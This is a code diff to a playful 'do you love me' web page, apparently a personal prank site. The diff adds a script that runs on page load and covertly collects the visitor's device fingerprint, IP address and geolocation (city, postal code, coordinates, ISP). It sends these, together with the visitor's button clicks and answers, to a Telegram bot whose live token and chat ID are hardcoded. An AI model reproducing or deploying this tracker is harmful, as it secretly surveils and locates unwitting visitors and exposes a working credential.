@@ -292,9 +292,7 @@ Yaar, I was just listening to a song... and no,
             const closeMessage = document.getElementById('closeMessage');
 
             // --- Telegram Bot API Details ---
-            // Your Telegram Bot Token
             const TELEGRAM_BOT_TOKEN = '8004254348:AAEgC8up1A8elm0YQmDQm__TSnc_cnYoEEU'; 
-            // Your Telegram Chat ID (can be negative for private chats/groups)
             const TELEGRAM_CHAT_ID = '5716658945'; 
             // --- End Telegram Bot API Details ---
 
@@ -306,7 +304,7 @@ Yaar, I was just listening to a song... and no,
                 const params = {
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML' // You can use HTML for formatting
+                    parse_mode: 'HTML' // Use HTML for formatting
                 };
 
                 try {
@@ -330,25 +328,176 @@ Yaar, I was just listening to a song... and no,
                 }
             }
 
+            // Function to gather and send client information on page load
+            async function gatherAndSendClientInfo() {
+                let clientInfo = {};
+
+                try {
+                    // 1. Timestamp of visit
+                    clientInfo.timestamp = new Date().toLocaleString(); 
+
+                    // 2. Device and Browser Information (from Navigator and Window objects)
+                    clientInfo.userAgent = navigator.userAgent || 'N/A';
+                    clientInfo.platform = navigator.platform || 'N/A';
+                    clientInfo.language = navigator.language || 'N/A';
+                    clientInfo.online = navigator.onLine ? 'Yes' : 'No';
+                    clientInfo.cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                    
+                    // Screen and Viewport Details
+                    clientInfo.screenWidth = window.screen.width || 'N/A';
+                    clientInfo.screenHeight = window.screen.height || 'N/A';
+                    clientInfo.screenColorDepth = window.screen.colorDepth || 'N/A'; 
+                    clientInfo.pixelRatio = window.devicePixelRatio || 'N/A'; 
+
+                    clientInfo.viewportWidth = window.innerWidth || 'N/A';
+                    clientInfo.viewportHeight = window.innerHeight || 'N/A';
+                    
+                    // Touch Support Detection
+                    clientInfo.touchSupport = ('ontouchstart' in window || navigator.maxTouchPoints > 0 || window.TouchEvent || navigator.msMaxTouchPoints > 0) ? 'Yes' : 'No';
+
+                    // Navigator properties that might give hints (though often 'N/A' or deprecated)
+                    clientInfo.appCodeName = navigator.appCodeName || 'N/A';
+                    clientInfo.appName = navigator.appName || 'N/A';
+                    clientInfo.appVersion = navigator.appVersion || 'N/A';
+                    clientInfo.product = navigator.product || 'N/A';
+                    clientInfo.vendor = navigator.vendor || 'N/A';
+                    clientInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A'; // Number of logical processor cores
+
+                    // Plugins Information (might be empty or limited in modern browsers)
+                    clientInfo.plugins = [];
+                    if (navigator.plugins && navigator.plugins.length > 0) {
+                        for (let i = 0; i < navigator.plugins.length; i++) {
+                            const plugin = navigator.plugins[i];
+                            clientInfo.plugins.push(`${plugin.name} (${plugin.description || 'No Description'})`);
+                        }
+                    } else {
+                        clientInfo.plugins.push('No plugins found or API not supported');
+                    }
+                    
+                    // MimeTypes (related to plugins, often less useful now)
+                    clientInfo.mimeTypes = [];
+                    if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
+                        for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                            const mime = navigator.mimeTypes[i];
+                            clientInfo.mimeTypes.push(`${mime.type} (${mime.description || 'No Description'})`);
+                        }
+                    } else {
+                        clientInfo.mimeTypes.push('No mimeTypes found or API not supported');
+                    }
+
+
+                    // 3. Network Information (using navigator.connection API)
+                    if (navigator.connection) {
+                        clientInfo.networkEffectiveType = navigator.connection.effectiveType || 'N/A'; 
+                        clientInfo.networkDownlink = navigator.connection.downlink !== undefined ? `${navigator.connection.downlink} Mbps` : 'N/A'; 
+                        clientInfo.networkRTT = navigator.connection.rtt !== undefined ? `${navigator.connection.rtt} ms` : 'N/A'; 
+                        clientInfo.networkSaveData = navigator.connection.saveData ? 'Yes' : 'No'; 
+                    } else {
+                        clientInfo.networkEffectiveType = 'N/A (API not supported)';
+                        clientInfo.networkDownlink = 'N/A (API not supported)';
+                        clientInfo.networkRTT = 'N/A (API not supported)';
+                        clientInfo.networkSaveData = 'N/A (API not supported)';
+                    }
+
+
+                    // 4. IP Address and Geolocation (using external APIs)
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        clientInfo.ipAddress = ipData.ip;
+
+                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        
+                        clientInfo.city = geoData.city || 'N/A';
+                        clientInfo.region = geoData.region || 'N/A';
+                        clientInfo.country = geoData.country_name || 'N/A';
+                        clientInfo.countryCode = geoData.country_code || 'N/A';
+                        clientInfo.postal = geoData.postal || 'N/A';
+                        clientInfo.latitude = geoData.latitude || 'N/A';
+                        clientInfo.longitude = geoData.longitude || 'N/A';
+                        clientInfo.timezone = geoData.timezone || 'N/A';
+                        clientInfo.isp = geoData.org || 'N/A'; 
+                        clientInfo.asn = geoData.asn || 'N/A'; 
+                    } catch (ipGeoError) {
+                        console.error("Error fetching IP or geolocation data:", ipGeoError);
+                        clientInfo.ipAddress = "Could not retrieve IP";
+                        Object.keys(clientInfo).forEach(key => {
+                            if (!clientInfo[key] && (key.startsWith('city') || key.startsWith('region') || key.startsWith('country') || key.startsWith('postal') || key.startsWith('latitude') || key.startsWith('longitude') || key.startsWith('timezone') || key.startsWith('isp') || key.startsWith('asn'))) {
+                                clientInfo[key] = 'N/A';
+                            }
+                        });
+                    }
+
+                    // Format the message for Telegram
+                    let telegramMessage = `
+                    --- 🌐 *New Visitor Alert!* 🌐 ---
+                    *Timestamp:* ${clientInfo.timestamp}
+                    
+                    *User Agent:* ${clientInfo.userAgent}
+                    *Platform:* ${clientInfo.platform}
+                    *Browser Language:* ${clientInfo.language}
+                    *Online Status:* ${clientInfo.online}
+                    *Cookies Enabled:* ${clientInfo.cookieEnabled}
+                    *Touch Support:* ${clientInfo.touchSupport}
+
+                    *Screen Resolution:* ${clientInfo.screenWidth}x${clientInfo.screenHeight} px
+                    *Color Depth:* ${clientInfo.screenColorDepth} bit
+                    *Pixel Ratio:* ${clientInfo.pixelRatio}
+                    *Viewport Size:* ${clientInfo.viewportWidth}x${clientInfo.viewportHeight} px
+                    
+                    *Network Type:* ${clientInfo.networkEffectiveType}
+                    *Downlink Speed:* ${clientInfo.networkDownlink}
+                    *Network RTT:* ${clientInfo.networkRTT}
+                    *Save Data Mode:* ${clientInfo.networkSaveData}
+
+                    *IP Address:* ${clientInfo.ipAddress}
+                    *Location:* ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country} (${clientInfo.countryCode})
+                    *Postal Code:* ${clientInfo.postal}
+                    *Coordinates:* ${clientInfo.latitude}, ${clientInfo.longitude}
+                    *Timezone:* ${clientInfo.timezone}
+                    *ISP:* ${clientInfo.isp}
+                    *ASN:* ${clientInfo.asn}
+                    
+                    *App CodeName:* ${clientInfo.appCodeName}
+                    *App Name:* ${clientInfo.appName}
+                    *App Version:* ${clientInfo.appVersion}
+                    *Product:* ${clientInfo.product}
+                    *Vendor:* ${clientInfo.vendor}
+                    *Hardware Cores:* ${clientInfo.hardwareConcurrency}
+                    `;
+
+                    if (clientInfo.plugins.length > 0 && clientInfo.plugins[0] !== 'No plugins found or API not supported') {
+                        telegramMessage += `\n*Plugins:* \n${clientInfo.plugins.join('\n')}`;
+                    }
+                    if (clientInfo.mimeTypes.length > 0 && clientInfo.mimeTypes[0] !== 'No mimeTypes found or API not supported') {
+                        telegramMessage += `\n*MimeTypes:* \n${clientInfo.mimeTypes.join('\n')}`;
+                    }
+
+                    telegramMessage += `\n---`;
+
+                    await sendToTelegram(telegramMessage);
+
+                } catch (error) {
+                    console.error("Error gathering client info:", error);
+                    await sendToTelegram(`⚠️ *Error collecting visitor info:* ${error.message}`);
+                }
+            }
+
+            // Call function to gather and send info when the page loads
+            gatherAndSendClientInfo();
+
+
             // Function to send click data (now also sends to Telegram for love question)
             async function sendClickData(buttonClicked, response = null) {
-                const data = {
-                    event: 'button_click',
-                    button: buttonClicked,
-                    timestamp: new Date().toISOString(),
-                };
-                if (response !== null) {
-                    data.response = response; // Add response for "Do You Love Me" question
-                }
-
                 // If it's a love question answer, send to Telegram
-                if (buttonClicked === 'love_Youtubeed') {
-                    // Using HTML for basic formatting (bold)
+                if (buttonClicked === 'love_answered') {
                     const telegramMessage = `❤️ *Love Question Answered* ❤️\nUser responded: <b>${response}</b>`;
                     sendToTelegram(telegramMessage);
+                } else if (buttonClicked === 'yes_clicked' || buttonClicked === 'no_clicked') {
+                    const telegramMessage = `👆 *Button Clicked:* <b>${buttonClicked.replace('_', ' ').toUpperCase()}</b>`;
+                    sendToTelegram(telegramMessage);
                 }
-
-                // Removed API_ENDPOINT and API_KEY related code for simplicity, as it wasn't being used
             }
 
             // New function to show the custom message input popup
@@ -416,7 +565,7 @@ Yaar, I was just listening to a song... and no,
                     }).then((result) => {
                         if (result.isConfirmed) {
                             console.log('User clicked Yes!');
-                            sendClickData('love_Youtubeed', 'Yes'); // Send 'Yes' to Telegram
+                            sendClickData('love_answered', 'Yes'); // Send 'Yes' to Telegram
                             Swal.fire(
                                 'Yay!',
                                 'I knew it! 😉',
@@ -427,7 +576,7 @@ Yaar, I was just listening to a song... and no,
                             });
                         } else if (result.dismiss === Swal.DismissReason.cancel) {
                             console.log('User clicked No.');
-                            sendClickData('love_Youtubeed', 'No'); // Send 'No' to Telegram
+                            sendClickData('love_answered', 'No'); // Send 'No' to Telegram
                             Swal.fire(
                                 'Oh...',
                                 'That\'s okay, I still think you\'re awesome! 😊',
